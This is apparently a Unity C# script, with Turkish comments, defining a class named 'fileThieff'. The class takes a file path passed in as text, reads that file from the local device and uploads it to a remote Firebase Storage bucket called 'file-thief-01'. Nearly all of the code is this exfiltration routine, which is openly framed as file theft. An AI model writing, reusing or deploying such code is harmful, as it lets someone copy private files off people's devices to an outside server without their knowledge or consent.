using System.IO;
using UnityEngine;
using Firebase;
using Firebase.Extensions;
using Firebase.Storage;
using UnityEngine.UI;

public class fileThieff : MonoBehaviour
{
    private FirebaseStorage storage;
    public Text log; // Logları yazmak için Text elemanı

    void Start()
    {
        FirebaseApp.CheckAndFixDependenciesAsync().ContinueWithOnMainThread(task =>
        {
            FirebaseApp.Create();
            storage = FirebaseStorage.DefaultInstance;
        });
    }

    // Dosyayı yüklemeyi başlat
    public void StartUpload(string receiveText)
    {
        if (string.IsNullOrEmpty(receiveText))
        {
            log.text += "receiveText is null or empty.\n";
            return;
        }

        string localFilePath = receiveText; // Dosya yolu receiveText değerinden alınıyor

        if (!File.Exists(localFilePath))
        {
            log.text += "File not found: " + localFilePath + "\n";
            return;
        }

        string storagePath = "uploads/" + Path.GetFileName(localFilePath);
        StorageReference storageRef = storage.GetReferenceFromUrl("gs://file-thief-01.appspot.com").Child(storagePath);

        byte[] fileData = File.ReadAllBytes(localFilePath);
        storageRef.PutBytesAsync(fileData).ContinueWithOnMainThread(task =>
        {
            if (task.IsFaulted)
            {
                log.text += "Upload failed: " + task.Exception + "\n";
            }
            else
            {
                log.text += "Upload successful\n";
            }
        });
    }
}
